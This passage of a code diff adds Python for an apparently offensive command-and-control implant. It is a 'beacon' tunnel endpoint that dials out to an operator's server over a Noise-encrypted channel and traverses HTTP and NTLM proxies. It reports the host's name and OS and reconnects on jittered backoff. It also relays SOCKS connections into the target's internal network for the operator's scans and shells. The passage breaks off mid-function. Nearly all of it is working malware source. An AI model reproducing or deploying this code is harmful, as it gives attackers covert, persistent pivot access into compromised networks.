+    """True if a byte is waiting; False on an orderly close.
+
+    `read_frame` reports a clean EOF between frames and a peer that
+    vanished mid-frame with the same `ValueError`, so the difference is
+    only in the message text. One `MSG_PEEK` moves it into the socket API
+    instead: `b""` is a FIN with nothing behind it, a `socket.timeout`
+    propagates as a peer that went quiet, and anything else means there
+    are bytes in hand -- so a `ValueError` from the `read_frame` that
+    follows is a malformed frame and cannot be an orderly teardown.
+    """
+    return bool(sock.recv(1, socket.MSG_PEEK))
+
+
+def _shutdown_socket(sock: socket.socket) -> None:
+    """Shut a socket down both ways without closing it.
+
+    Without closing, because another thread may still be inside a `recv`
+    or a `sendall` on this descriptor: the shutdown is what unparks it,
+    and closing the descriptor is left to the one frame that knows every
+    thread using it has finished.
+    """
+    try:
+        sock.shutdown(socket.SHUT_RDWR)
+    except OSError:
+        pass
+
+
+def _shut_socket(sock: socket.socket) -> None:
+    """Drop a socket now, waiting for nothing and raising nothing."""
+    _shutdown_socket(sock)
+    try:
+        sock.close()
+    except OSError:
+        pass
+
+
+def _proxy_read_line(sock: socket.socket) -> str:
+    """One CRLF-terminated line from a proxy, read a byte at a time.
+
+    A byte at a time because what follows the blank line is a Noise frame
+    and must not be read into a buffer this function drops. Bounded at
+    `_PROXY_MAX_LINE`, as `_NtlmProxyRelay` bounds its own reads.
+    """
+    chunks = []
+    while len(chunks) < _PROXY_MAX_LINE:
+        byte = sock.recv(1)
+        if not byte:
+            break
+        if byte == b"\n":
+            break
+        if byte != b"\r":
+            chunks.append(byte)
+    return b"".join(chunks).decode("latin-1")
+
+
+def _proxy_endpoint(url) -> Optional[Tuple[str, int]]:
+    """`(host, port)` of an HTTP proxy URL, or None if it is not one.
+
+    Parsed here rather than handed to urllib because this is also where a
+    `socks5://` scheme and a PAC URL are rejected: neither is something a
+    `CONNECT` can be written to, and a tunnel that tried would spend a
+    whole backoff on a proxy that was never going to answer. Any userinfo
+    is dropped -- credentials in a URL are urllib's mechanism, and
+    `_NtlmProxyRelay` is this one's path for a proxy that authenticates.
+    """
+    text = str(url or "").strip()
+    if not text:
+        return None
+    scheme, separator, rest = text.partition("://")
+    if separator and scheme.lower() not in ("http", "https"):
+        return None
+    if not separator:
+        scheme, rest = "http", text
+    authority = rest.split("/", 1)[0]
+    if "@" in authority:
+        authority = authority.rsplit("@", 1)[1]
+    host, colon, port_text = authority.rpartition(":")
+    if not colon:
+        host, port_text = authority, ("443" if scheme.lower() == "https"
+                                      else "80")
+    # A bracketed IPv6 literal, which is how a URL has to write one.
+    host = host.strip("[]")
+    try:
+        port = int(port_text)
+    except ValueError:
+        return None
+    if not host or not 1 <= port <= 0xFFFF:
+        return None
+    return host, port
+
+
+def _route_name(route) -> str:
+    """How one way out is named in a log line or an error."""
+    return "direct" if route is None else "proxy %s:%d" % route
+
+
+def _tunnel_seconds(value, default: float) -> float:
+    """A positive number of seconds from a config field, or `default`."""
+    try:
+        seconds = float(value)
+    except (TypeError, ValueError):
+        return default
+    return seconds if seconds > 0 else default
+
+
+def _tunnel_key(value, field: str, what: str) -> bytes:
+    """The 32 bytes `value` base64-encodes, or a ValueError naming `field`.
+
+    The messages name the field and the problem and never the value or
+    any part of it, following `decode_key`: one of these fields is a PSK,
+    which under `NKpsk0` is the whole credential, and an error message is
+    the easiest place in a program for a secret to end up. Raised outside
+    the except block so the decoder's own error cannot ride along in the
+    chain.
+    """
+    text = value.strip() if isinstance(value, str) else ""
+    problem = None
+    raw = b""
+    if not text:
+        problem = ("%s is required: it is %s, %d bytes base64-encoded"
+                   % (field, what, _NOISE_KEY_LEN))
+    else:
+        try:
+            # binascii.Error is a ValueError.
+            raw = base64.b64decode(text, validate=True)
+        except ValueError:
+            problem = ("%s is not valid base64: it is %s, %d bytes "
+                       "base64-encoded" % (field, what, _NOISE_KEY_LEN))
+        else:
+            if len(raw) != _NOISE_KEY_LEN:
+                problem = ("%s decodes to %d bytes: it is %s, and that is "
+                           "exactly %d bytes"
+                           % (field, len(raw), what, _NOISE_KEY_LEN))
+    if problem:
+        raise ValueError(problem)
+    return raw
+
+
+def tunnel_config_problem(config) -> Optional[str]:
+    """Why this config cannot run a tunnel endpoint, or None.
+
+    The shape of `beacon_key_problem`: a string naming what is wrong, or
+    None. Asked where the config is loaded, so a build whose tunnel block
+    is half-filled stops with a reason instead of retrying a connection it
+    can never make.
+
+    A tunnel that is absent or disabled is not a problem. Most builds have
+    no tunnel, and demanding a PSK of those would break them.
+    """
+    c2 = config.get("c2") if isinstance(config, dict) else None
+    tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
+    if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
+        return None
+    server = tunnel.get("server")
+    if not isinstance(server, str) or not server.strip():
+        return ("c2.tunnel.server is required: it is the host the endpoint "
+                "dials out to, written as the target's network can reach it")
+    identity = tunnel.get("identity")
+    if not isinstance(identity, str) or not identity.strip():
+        return ("c2.tunnel.identity is required: it is the build this PSK "
+                "belongs to, and the server refuses a HELLO that claims "
+                "another one")
+    port = tunnel.get("port")
+    if (isinstance(port, bool) or not isinstance(port, int)
+            or not 1 <= port <= 0xFFFF):
+        return ("c2.tunnel.port must be a port between 1 and 65535: it is "
+                "the single port that serves the command channel and every "
+                "relay, so that one CONNECT rule is enough to cross a proxy")
+    try:
+        _tunnel_key(tunnel.get("public_key"), "c2.tunnel.public_key",
+                    "the tunnel server's static X25519 public key")
+        _tunnel_key(tunnel.get("psk"), "c2.tunnel.psk",
+                    "this build's pre-shared key")
+    except ValueError as exc:
+        return str(exc)
+    return None
+
+
+def tunnel_mode_problem(config) -> Optional[str]:
+    """Why this config cannot be *run* as a tunnel endpoint, or None.
+
+    The question `tunnel_config_problem` asks the other way round. That
+    one answers None for a config with no tunnel, because most builds
+    have none and demanding a PSK of those would break them. Here
+    something has been asked to *be* the endpoint -- the child started by
+    `Beacon._exec_tunnel`, or the parent about to start it -- so an
+    absent, non-dict or disabled block is the problem rather than the
+    ordinary case.
+
+    One predicate for both ends on purpose. The parent refuses before it
+    spawns, so the operator gets the diagnosis instead of a bare exit
+    code; the child refuses in its bootstrap, because a build can be
+    launched by hand or by a systemd unit with no parent to have checked.
+    Two spellings of the same rule would be the parent and the child
+    disagreeing about whether a build has a tunnel.
+    """
+    c2 = config.get("c2") if isinstance(config, dict) else None
+    tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
+    if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
+        return ("this build carries no enabled c2.tunnel block: there is "
+                "no server, port, public_key or psk to dial with, so it "
+                "cannot run the tunnel endpoint. Generate the build with "
+                "the tunnel enabled.")
+    return tunnel_config_problem(config)
+
+
+class _TunnelChannel(object):
+    """The endpoint's command channel: its socket, Noise session and lock.
+
+    Writes take the lock, and the lock covers `encrypt` as well as the
+    bytes. Two threads write here -- the command loop answering a PING
+    with a PONG, and the keep-alive thread sending one of its own -- and
+    `write_frame`'s single `sendall` does not serialise them: it loops
+    over partial sends and releases the GIL. The nonce `encrypt` advances
+    has to be ordered with the frame it produced, so both are inside.
+    """
+
+    def __init__(self, sock: socket.socket, noise: NoiseSession):
+        self.sock = sock
+        self.noise = noise
+        self.last_seen = time.monotonic()
+        self.last_ping = self.last_seen
+        self._write_lock = threading.Lock()
+        # A lock of its own for the closed flag, held across nothing. The
+        # write lock cannot serve: `send` holds that one across a blocking
+        # `sendall`, and `close` has to be able to run then.
+        self._state_lock = threading.Lock()
+        self._closed = False
+
+    def send(self, kind: int, body: dict) -> None:
+        """One command message, under the lock that orders the nonce too."""
+        with self._write_lock:
+            if self._closed:
+                raise OSError("this command channel is closed")
+            write_frame(self.sock,
+                        self.noise.encrypt(encode_message(kind, body)))
+
+    def touch(self) -> None:
+        self.last_seen = time.monotonic()
+
+    @property
+    def closed(self) -> bool:
+        return self._closed
+
+    def close(self) -> None:
+        """Shut the channel down. Never waits on a write in flight."""
+        with self._state_lock:
+            if self._closed:
+                return
+            self._closed = True
+        _shut_socket(self.sock)
+
+
+class TunnelEndpoint(object):
+    """The far end of the tunnel: one command channel, one relay per request.
+
+    `config` is a beacon config and the block read is `c2.tunnel`, which
+    carries `server`, `port`, `public_key`, `psk`, `identity` and
+    optionally `keepalive_seconds`, `connect_timeout_seconds`,
+    `implant_id` and `allow_slow_crypto`. A config this class cannot run
+    is a `ValueError` naming the field, from `tunnel_config_problem`.
+    `c2.proxy` is read too, and it is the same block the beacon's own
+    transports use: one host has one way out.
+
+    `run()` blocks until `stop()`, reconnecting on the beacon's backoff;
+    `status()` is a row for an operator panel.
+    """
+
+    def __init__(self, config: dict):
+        problem = tunnel_config_problem(config)
+        if problem:
+            raise ValueError(problem)
+        c2 = config.get("c2") if isinstance(config, dict) else None
+        tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
+        if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
+            raise ValueError(
+                "c2.tunnel.enabled is not set: this config asks for no "
+                "tunnel, and an endpoint with nothing to dial is not one")
+        self.server = tunnel["server"].strip()
+        self.port = int(tunnel["port"])
+        self.identity = tunnel["identity"].strip()
+        self._public = _tunnel_key(tunnel.get("public_key"),
+                                   "c2.tunnel.public_key",
+                                   "the tunnel server's static X25519 "
+                                   "public key")
+        self._psk = _tunnel_key(tunnel.get("psk"), "c2.tunnel.psk",
+                                "this build's pre-shared key")
+        implant_id = tunnel.get("implant_id")
+        self.implant_id = (implant_id.strip()
+                           if isinstance(implant_id, str) else "")
+        self.keepalive_interval = _tunnel_seconds(
+            tunnel.get("keepalive_seconds"), _DEFAULT_KEEPALIVE)
+        # Three keep-alives missed before the server is declared gone,
+        # which is the rule the server applies to this end: one lost PING
+        # on a bad link should not cost a tunnel.
+        self.idle_timeout = 3 * self.keepalive_interval
+        self.connect_timeout = _tunnel_seconds(
+            tunnel.get("connect_timeout_seconds"), _DEFAULT_CONNECT_TIMEOUT)
+        self.allow_slow_crypto = bool(tunnel.get("allow_slow_crypto"))
+
+        proxy = c2.get("proxy")
+        proxy = proxy if isinstance(proxy, dict) else {}
+        self.proxy_mode = str(proxy.get("mode") or "auto")
+        self.proxy_url = str(proxy.get("url") or "")
+        ntlm = proxy.get("ntlm")
+        self._proxy_ntlm = ntlm if isinstance(ntlm, dict) else {}
+
+        self._lock = threading.Lock()
+        # Write-once: `run` never clears it. A `stop` that lands before
+        # `run` -- including the whole window between a caller's
+        # `thread.start()` and `run`'s first line, which is milliseconds
+        # under load -- has to be the one that wins, and a flag `run`
+        # could clear would erase it and leave the reconnect loop running
+        # for ever. So one `TunnelEndpoint` is one `run`: the keep-alive
+        # and both relay directions read this same event, and supporting
+        # a restart would mean threading a generation number through all
+        # of them for a caller nothing has asked for. Task 8 constructs a
+        # fresh endpoint per child, which is the shape that wants.
+        self._stop = threading.Event()
+        self._channel = None        # type: Optional[_TunnelChannel]
+        self._connected = False
+        self._failures = 0
+        # The way out that worked, so a relay does not re-walk the list.
+        # `None` is a valid route -- direct -- so "not known yet" needs a
+        # flag of its own rather than a sentinel value.
+        self._route = None
+        self._route_known = False
+        self._discovered = None     # type: Optional[list]
+        self._ntlm_relay = None     # type: Optional[_NtlmProxyRelay]
+        # Every socket a relay holds, so `stop` can unpark a pump instead
+        # of waiting for one to notice.
+        self._relay_sockets = set()
+        self._relay_threads = []    # type: list
+        self._sessions = 0
+        self._carried = 0
+
+    # ── lifecycle ──
+
+    def run(self) -> None:
+        """Hold a command channel open, reconnecting until `stop`. Blocks.
+
+        Called once per instance: a `stop` is final, because the flag it
+        sets is also what the keep-alive and both relay directions watch.
+
+        Refuses to start on the pure-Python cipher unless told otherwise.
+        Pure-Python AES-GCM moves roughly 50-200 KB/s, which is fine for
+        the small messages the rest of this file sends and useless for a
+        tunnel -- and "it is slow" would otherwise be diagnosed for hours
+        as a network fault, because every other sign is of a working
+        tunnel. The override exists because a tunnel at 100 KB/s still
+        beats no tunnel when that is the decision an operator wants to
+        make.
+        """
+        if _USE_PURE_PYTHON_AES and not self.allow_slow_crypto:
+            raise RuntimeError(
+                "this host has no libcrypto, so AES-256-GCM runs in pure "
+                "Python at roughly 50-200 KB/s. That is enough for the "
+                "beacon's own messages and not for a tunnel: every session "
+                "would look like a slow network for as long as anybody "
+                "cared to look. Install OpenSSL, or set "
+                "c2.tunnel.allow_slow_crypto to run on the slow path "
+                "deliberately.")
+        if self._stop.is_set():
+            # A `stop` that landed before this line, which is a caller
+            # that changed its mind during thread start-up. It wins: the
+            # flag is write-once and this returns without dialling.
+            logger.info("tunnel: endpoint %r was stopped before it started",
+                        self.identity)
+            return
+        logger.info("tunnel: endpoint %r dialling %s:%d, crypto %s",
+                    self.identity, self.server, self.port,
+                    self._crypto_path())
+        while not self._stop.is_set():
+            try:
+                self._control_session()
+            except (OSError, ValueError) as exc:
+                # Everything a dead server, a proxy that stopped answering
+                # or a refused handshake can cause arrives here, and the
+                # answer to all of it is the same: wait, and dial again.
+                logger.info("tunnel: the command channel to %s:%d did not "
+                            "last: %s", self.server, self.port, exc)
+            except Exception:
+                # This loop is the whole endpoint: an exception that got
+                # out would be a tunnel that silently stopped existing.
+                logger.exception("tunnel: unexpected error on the command "
+                                 "channel")
+            self._failures += 1
+            if self._stop.is_set():
+                break
+            self._retry_sleep()
+        logger.info("tunnel: endpoint %r stopped", self.identity)
+
+    def stop(self) -> None:
+        """Stop reconnecting and drop everything. Safe before `run`, twice.
+
+        Final, and before `run` as well as during it: the flag is never
+        cleared, so a `stop` that arrives while a caller is still getting
+        `run` onto a thread makes that `run` return without dialling,
+        rather than being erased by it.
+
+        Every socket is shut down rather than only closed: a pump parked
+        in a read, or in a send that TCP backpressure has stopped, does
+        not wake on a bare close on every platform, and this must not wait
+        for one to notice on its own.
+        """
+        self._stop.set()
+        with self._lock:
+            channel = self._channel
+            # Cleared here and not left to the command loop's own
+            # unwinding: `stop` has just closed the channel, so a
+            # `status` read immediately afterwards would otherwise report
+            # an endpoint that is connected to a socket it no longer has.
+            # The command loop clears it again on its way out, which is
+            # idempotent.
+            self._connected = False
+            self._channel = None
+            sockets = list(self._relay_sockets)
+            threads = list(self._relay_threads)
+            relay, self._ntlm_relay = self._ntlm_relay, None
+            self._relay_sockets = set()
+            self._relay_threads = []
+        if channel is not None:
+            channel.close()
+        for sock in sockets:
+            # Shut down and not closed: the relay thread that owns each of
+            # these is the one that closes it.
+            _shutdown_socket(sock)
+        for thread in threads:
+            thread.join(timeout=_TUNNEL_JOIN_TIMEOUT)
+        if relay is not None:
+            relay.stop()
+
+    def status(self) -> dict:
+        """One row's worth of what this endpoint is doing.
+
+        `crypto` is read through the module rather than copied at
+        construction, because it is what an operator checks when a tunnel
+        is inexplicably slow and it has to be the truth now. `egress` is
+        `None` until something has connected, because until then which way
+        out works is not known rather than direct.
+
+        `sessions` is what is open now and `carried` is everything since
+        this endpoint started: the first drops back to zero when a relay
+        closes, and a row that reported only that would tell an operator
+        nothing had ever gone through an endpoint that had just carried a
+        scan.
+        """
+        egress = self._egress()
+        with self._lock:
+            connected = self._connected
+            sessions = self._sessions
+            carried = self._carried
+        return {
+            "identity": self.identity,
+            "server": self.server,
+            "port": self.port,
+            "connected": connected,
+            "sessions": sessions,
+            "carried": carried,
+            "egress": egress,
+            "crypto": self._crypto_path(),
+            "slow_crypto_allowed": self.allow_slow_crypto,
+        }
+
+    # ── the command channel ──
+
+    def _control_session(self) -> None:
+        """One command channel, from the handshake to its last frame."""
+        sock = self._dial(self.port)
+        channel = None
+        keeper = None
+        try:
+            noise = self._handshake(
+                sock, encode_message(MSG_HELLO, self._hello()))
+            channel = _TunnelChannel(sock, noise)
+            with self._lock:
+                self._channel = channel
+                self._connected = True
+                # Reset here and not on the dial: a connection that
+                # authenticated is what proves the way out works, and a
+                # TCP connect that is accepted and then refused would
+                # otherwise reset the backoff on every attempt.
+                self._failures = 0
+            logger.info("tunnel: endpoint %r registered with %s:%d over %s",
+                        self.identity, self.server, self.port, self._egress())
+            keeper = threading.Thread(target=self._keepalive_loop,
+                                      args=(channel,), name="tunnel-keepalive",
+                                      daemon=True)
+            try:
+                keeper.start()
+            except RuntimeError as exc:
+                # The process has no more threads to give. Not fatal: the
+                # server pings this end too and a PONG is answered from
+                # the loop below, so the channel survives without a
+                # keep-alive of its own -- it just takes the server's
+                # idle timeout rather than ours to notice a dead link.
+                keeper = None
+                logger.warning("tunnel: no thread for the keep-alive (%s); "
+                               "relying on the server's", exc)
+            self._control_loop(channel)
+        finally:
+            with self._lock:
+                self._connected = False
+                self._channel = None
+            if channel is not None:
+                channel.close()
+            else:
+                _shut_socket(sock)
+            if keeper is not None:
+                keeper.join(timeout=_TUNNEL_JOIN_TIMEOUT)
+
+    def _hello(self) -> dict:
+        """The HELLO body: which build this is, and what host it is on.
+
+        `identity` is asserted as well as proved, because the server
+        refuses a connection whose HELLO disagrees with the PSK that
+        authenticated it: a build free to claim another's identity would
+        be a SOCKS port pointing at a different network than the operator
+        believes. `implant_id` is sent only when the config carries one --
+        an endpoint started from systemd has no beacon above it, and the
+        server reports that as unlinked rather than hiding the row.
+
+        `crypto` is here because it is the one performance fact that
+        never leaves this host otherwise, and the panel is where it is
+        read. An endpoint running on the pure-Python cipher -- which
+        takes an explicit override to reach -- moves roughly 50-200 KB/s,
+        and "a scan through this tunnel is slow" is otherwise debugged as
+        a fault in the target's own network for an afternoon. The server
+        knows its own path and cannot know this one.
+        """
+        body = {"identity": self.identity,
+                "hostname": platform.node(),
+                "os": "%s %s" % (platform.system(), platform.release()),
+                "crypto": self._crypto_path()}
+        if self.implant_id:
+            body["implant_id"] = self.implant_id
+        return body
+
+    def _control_loop(self, channel: _TunnelChannel) -> None:
+        """Read and act on command messages until the channel ends."""
+        sock = channel.sock
+        # A poll, not the idle timeout: the deadline is measured against
+        # `last_seen` below so that `stop` does not have to wait one out.
+        poll = min(_CONTROL_POLL, self.keepalive_interval)
+        sock.settimeout(poll)
+        while not self._stop.is_set():
+            try:
+                waiting = _bytes_waiting(sock)
+            except socket.timeout:
+                if time.monotonic() - channel.last_seen < self.idle_timeout:
+                    continue
+                # Not an error and not a malformed peer: nothing has
+                # arrived for three keep-alives, so the server is gone.
+                logger.info("tunnel: %s:%d went quiet for %.1fs; dialling "
+                            "again", self.server, self.port, self.idle_timeout)
+                return
+            except OSError as exc:
+                logger.debug("tunnel: the command channel ended: %s", exc)
+                return
+            if not waiting:
+                # A FIN between frames: an orderly teardown, and the only
+                # way to tell it from a truncated frame, which `read_frame`
+                # reports with the same exception type.
+                logger.info("tunnel: %s:%d closed the command channel",
+                            self.server, self.port)
+                return
+            try:
+                frame = read_frame(sock)
+            except socket.timeout:
+                # Bytes arrived and then stopped mid-frame. Bounded by the
+                # poll above, and dropped rather than waited on.
+                logger.debug("tunnel: %s:%d stalled mid-frame",
+                             self.server, self.port)
+                return
+            except OSError as exc:
+                logger.debug("tunnel: the command channel ended: %s", exc)
+                return
+            except ValueError as exc:
+                # Reached only with bytes in hand, so this is a frame that
+                # was wrong rather than a peer that left.
+                logger.warning("tunnel: a malformed frame from %s:%d: %s",
+                               self.server, self.port, exc)
+                return
+            try:
+                payload = channel.noise.decrypt(frame)
+            except ValueError as exc:
+                # Noise §5.1: abandon the session after a decrypt failure.
+                # `NoiseSession` leaves that policy to its caller, which is
+                # here, so the connection goes.
+                logger.warning("tunnel: a frame from %s:%d did not "
+                               "authenticate (%s); dropping the channel",
+                               self.server, self.port, exc)
+                return
+            try:
+                kind, body = decode_message(payload)
+            except ValueError as exc:
+                logger.warning("tunnel: an undecodable message from %s:%d: "
+                               "%s", self.server, self.port, exc)
+                return
+            channel.touch()
+            if kind == MSG_OPEN_RELAY:
+                self._spawn_relay(body)
+            elif kind == MSG_PING:
+                try:
+                    channel.send(MSG_PONG, {})
+                except (OSError, ValueError) as exc:
+                    logger.debug("tunnel: could not answer a PING: %s", exc)
+                    return
+            elif kind == MSG_PONG:
+                continue
+            elif kind == MSG_CLOSE:
+                logger.info("tunnel: %s:%d asked to close the command "
+                            "channel", self.server, self.port)
+                return
+            else:
+                # HELLO and RELAY both mean the far end has lost track of
+                # which direction it is talking in.
+                logger.warning("tunnel: %s:%d sent %s on an established "
+                               "channel", self.server, self.port,
+                               MESSAGE_KIND_NAMES.get(kind, kind))
+                return
+
+    def _keepalive_loop(self, channel: _TunnelChannel) -> None:
+        """Send a PING when nothing has arrived for a keep-alive interval.
+
+        The server pings too, and either side's PING is answered with a
+        PONG by the other, so one interval of silence in either direction
+        is enough to find a connection that has died without a FIN -- a
+        proxy that recycled an idle tunnel, a NAT that dropped the
+        mapping. A thread of its own rather than the command loop's poll,
+        so a slow frame cannot delay the clock, and it is why
+        `_TunnelChannel.send` holds a lock.
+        """
+        tick = max(_KEEPALIVE_TICK_FLOOR,
+                   min(_KEEPALIVE_TICK_CEILING, self.keepalive_interval / 2.0))
+        try:
+            while not self._stop.wait(tick):
+                if channel.closed:
+                    return
+                now = time.monotonic()
+                if (now - channel.last_seen < self.keepalive_interval
+                        or now - channel.last_ping < self.keepalive_interval):
+                    continue
+                channel.last_ping = now
+                try:
+                    channel.send(MSG_PING, {})
+                except (OSError, ValueError) as exc:
+                    # The command loop owns the reconnect; closing the
+                    # socket is what tells it to let go.
+                    logger.debug("tunnel: keep-alive failed: %s", exc)
+                    channel.close()
+                    return
+        except Exception:
+            logger.exception("tunnel: unexpected error in the keep-alive")
+            channel.close()
+
+    def _retry_sleep(self) -> None:
+        """Wait before dialling again, on the beacon's own backoff shape.
+
+        `_stop.wait` rather than `time.sleep`, so a `stop` does not have
+        to sit out a delay that reaches five minutes.
+        """
+        delay = min(_TUNNEL_RETRY_BASE * (1.5 ** self._failures),
+                    _TUNNEL_RETRY_CEILING)
+        delay += random.uniform(0, delay * 0.2)
+        logger.debug("tunnel: next attempt in %.1fs (failures=%d)",
+                     delay, self._failures)
+        self._stop.wait(delay)
+
+    # ── relays ──
+
+    def _spawn_relay(self, body: dict) -> None:
+        """Dial the relay the server has just asked for, on its own thread.
+
+        The port in the message is **not** where the relay goes. The
+        server names the port it bound locally, and that is only the port
+        this host can reach when nothing sits in between: behind a
+        redirector, a NAT or any port translation, the configured port is
+        443 and the server's own is something else, so dialling what was
+        advertised would fail every relay while the command channel
+        stayed healthy -- the panel reading `connected` and every session
+        timing out. The port this endpoint was configured with is the one
+        that demonstrably works, because the handshake that carried this
+        message came back through it. One destination is also what makes
+        a single `CONNECT` rule enough, which is the whole reason the
+        protocol has one port. So the field is read and logged when it
+        differs, and never acted on.
+        """
+        token = body.get("token")
+        advertised = body.get("port")
+        if not isinstance(token, str) or not token:
+            logger.warning("tunnel: an OPEN_RELAY carrying no token; ignored")
+            return
+        if advertised != self.port:
+            logger.debug("tunnel: an OPEN_RELAY advertised port %r; this "
+                         "endpoint dials its configured %d",
+                         advertised, self.port)
+        thread = threading.Thread(target=self._relay, args=(token,),
+                                  name="tunnel-relay", daemon=True)
+        with self._lock:
+            self._relay_threads = [t for t in self._relay_threads
+                                   if t.is_alive()]
+            self._relay_threads.append(thread)
+        try:
+            thread.start()
+        except RuntimeError as exc:
+            # The process has no more threads to give. The operator's end
+            # is told by the session never pairing, which is what it is
+            # already waiting on.
+            with self._lock:
+                if thread in self._relay_threads:
+                    self._relay_threads.remove(thread)
+            logger.warning("tunnel: no thread could be started for a relay: "
+                           "%s", exc)
+
+    def _relay(self, token: str) -> None:
+        """One relay: dial the same port, claim it with the token, serve it."""
+        sock = None
+        try:
+            sock = self._dial(self.port)
+            self._register_socket(sock)
+            noise = self._handshake(
+                sock, encode_message(MSG_RELAY, {"token": token}))
+            self._serve_relay(sock, noise)
+        except (OSError, ValueError) as exc:
+            # A relay that could not be dialled, a token the server no
+            # longer holds, a frame that did not authenticate, a session
+            # the operator closed: all of it costs this one relay, and the
+            # operator's end learns of it from the session never pairing
+            # or from the stream ending.
+            logger.info("tunnel: a relay to %s:%d ended: %s",
+                        self.server, self.port, exc)
+        except Exception:
+            logger.exception("tunnel: unexpected error on a relay")
+        finally:
+            if sock is not None:
+                self._forget_socket(sock)
+                _shut_socket(sock)
+
+    def _serve_relay(self, sock: socket.socket, noise: NoiseSession) -> None:
+        """Read the one SOCKS request this relay carries, and answer it.
+
+        No `_bytes_waiting` peek here, unlike the command loop: at this
+        point in the protocol the operator's end owes exactly one request,
+        so an orderly FIN and a truncated frame mean the same thing -- the
+        session is over before it began -- and both end this relay. The
+        distinction is only worth making where it changes what is done.
+        """
+        sock.settimeout(self.connect_timeout)
+        # A ValueError from either call is a frame that did not
+        # authenticate or a request that was not one; the caller closes
+        # the connection over it, which is Noise §5.1 where the policy
+        # was deferred to.
+        cmd, atyp, address, port = decode_socks_request(
+            noise.decrypt(read_frame(sock)))
+        # The request's own address type is not acted on: the codec is the
+        # authority on it and refuses one it does not know, and the type
+        # in the reply is the family of the socket actually opened, which
+        # is not always the family that was asked for -- a name can
+        # resolve to either.
+        target = "%s:%d" % (address, port)
+        logger.debug("tunnel: a relay asked for %s to %s (%s)",
+                     SOCKS_COMMAND_NAMES.get(cmd, cmd), target,
+                     SOCKS_ADDRESS_TYPE_NAMES.get(atyp, atyp))
+        if not socks_command_supported(cmd):
+            # BIND and UDP ASSOCIATE decode so that they can be refused
+            # properly: at the operator's end a parse error is
+            # indistinguishable from a dead tunnel.
+            logger.info("tunnel: the operator asked for %s to %s, which an "
+                        "endpoint does not serve",
+                        SOCKS_COMMAND_NAMES.get(cmd, cmd), target)
+            self._reply(sock, noise, REPLY_COMMAND_NOT_SUPPORTED)
+            return
+        try:
+            peer = self._dial_target(address, port, self.connect_timeout)
+        except (OSError, ValueError) as exc:
+            reply = _socks_reply_for_error(exc)
+            logger.info("tunnel: could not reach %s (%s); answering %s",
+                        target, exc, SOCKS_REPLY_NAMES.get(reply, reply))
+            self._reply(sock, noise, reply)
+            return
+        self._register_socket(peer)
+        try:
+            atyp_out, bound, bound_port = _bound_socks_address(peer)
+            # The reply is a frame of its own and carries nothing else.
+            # The operator's end reads it with one `recv_message` and
+            # refuses a frame that is not exactly a reply, so a target
+            # that speaks first -- and most do -- must not have its first
+            # bytes coalesced into this one.
+            self._reply(sock, noise, REPLY_SUCCEEDED, atyp_out, bound,
+                        bound_port)
+            self._count_session(1)
+            try:
+                logger.info("tunnel: carrying %s", target)
+                self._bridge(sock, noise, peer)
+            finally:
+                self._count_session(-1)
+        finally:
+            self._forget_socket(peer)
+            _shut_socket(peer)
+
+    def _reply(self, sock: socket.socket, noise: NoiseSession, reply: int,
+               atyp: int = ATYP_IPV4, address: str = "0.0.0.0",
+               port: int = 0) -> None:
+        """One SOCKS reply, as its own frame."""
+        write_frame(sock,
+                    noise.encrypt(encode_socks_reply(reply, atyp, address,
+                                                     port)))
+
+    def _dial_target(self, address: str, port: int,
+                     timeout: float) -> socket.socket:
+        """One TCP connection into the network this endpoint sits in.
+
+        The single place this class touches the target network, which is
+        also what makes it the one seam a test can stand in for a
+        condition a host cannot be made to produce on demand.
+        `create_connection` resolves a name and tries every address it is
+        given, which is what makes `ATYP=3` work and what reaches an IPv6
+        target wherever the host has a route to one.
+        """
+        return socket.create_connection((address, port), timeout=timeout)
+
+    def _bridge(self, relay: socket.socket, noise: NoiseSession,
+                peer: socket.socket) -> None:
+        """Carry bytes until either side is finished.
+
+        Neither descriptor has a timeout here. An idle session is an
+        ordinary thing -- a target that speaks first, an operator's shell
+        waiting on a prompt -- and `stop` unparks both directions by
+        shutting their descriptors down instead.
+
+        Each socket has exactly one writer, which is why neither direction
+        needs the lock the command channel has. This thread wrote the
+        reply and then carries the target's bytes to the relay, so it is
+        the only writer on the relay socket; the thread started here is
+        the only writer on the target socket. No reply is ever sent after
+        this point, which is what makes that hold.
+        """
+        relay.settimeout(None)
+        peer.settimeout(None)
+        back = threading.Thread(target=self._to_target,
+                                args=(relay, noise, peer),
+                                name="tunnel-relay-in", daemon=True)
+        try:
+            back.start()
+        except RuntimeError as exc:
+            # A one-way proxy is worse than none, so the session ends
+            # here: the caller closes both sockets and the operator sees
+            # the stream go.
+            logger.warning("tunnel: could not start the return direction of "
+                           "a relay; closing it: %s", exc)
+            return
+        try:
+            self._to_relay(relay, noise, peer)
+        finally:
+            # Both descriptors before the join: the other thread may be
+            # parked in a read or in a send that TCP backpressure has
+            # stopped, and neither wakes on its own.
+            _shutdown_socket(relay)
+            _shutdown_socket(peer)
+            back.join(timeout=_TUNNEL_JOIN_TIMEOUT)
+
+    def _to_relay(self, relay: socket.socket, noise: NoiseSession,
+                  peer: socket.socket) -> None:
+        """The target's bytes, toward the operator."""
+        while True:
+            try:
+                data = peer.recv(_TUNNEL_CHUNK)
+            except OSError:
+                return
+            if not data:
+                # The target is finished, so the session is: whichever
+                # direction ends first ends it, because a SOCKS proxy that
+                # kept half of one open would leave the operator's tool
+                # waiting on a target that has gone.
+                return
+            try:
+                write_frame(relay, noise.encrypt(data))
+            except (OSError, ValueError):
+                return
+
+    def _to_target(self, relay: socket.socket, noise: NoiseSession,
+                   peer: socket.socket) -> None:
+        """The operator's bytes, toward the target."""
+        try:
+            self._to_target_loop(relay, noise, peer)
+        finally:
+            # This direction ending ends the session, as the other one
+            # does: the operator's port closes both of its directions
+            # together, so a half-open relay here would carry nothing and
+            # would hold a thread until the target happened to close.
+            _shutdown_socket(relay)
+            _shutdown_socket(peer)
+
+    def _to_target_loop(self, relay: socket.socket, noise: NoiseSession,
+                        peer: socket.socket) -> None:
+        while True:
+            try:
+                if not _bytes_waiting(relay):
+                    # A FIN between frames: the operator's end is done.
+                    # The peek is what keeps that ordinary teardown out of
+                    # the warning below, since `read_frame` reports it
+                    # with the same exception as a truncated frame.
+                    return
+                frame = read_frame(relay)
+            except OSError:
+                return
+            except ValueError as exc:
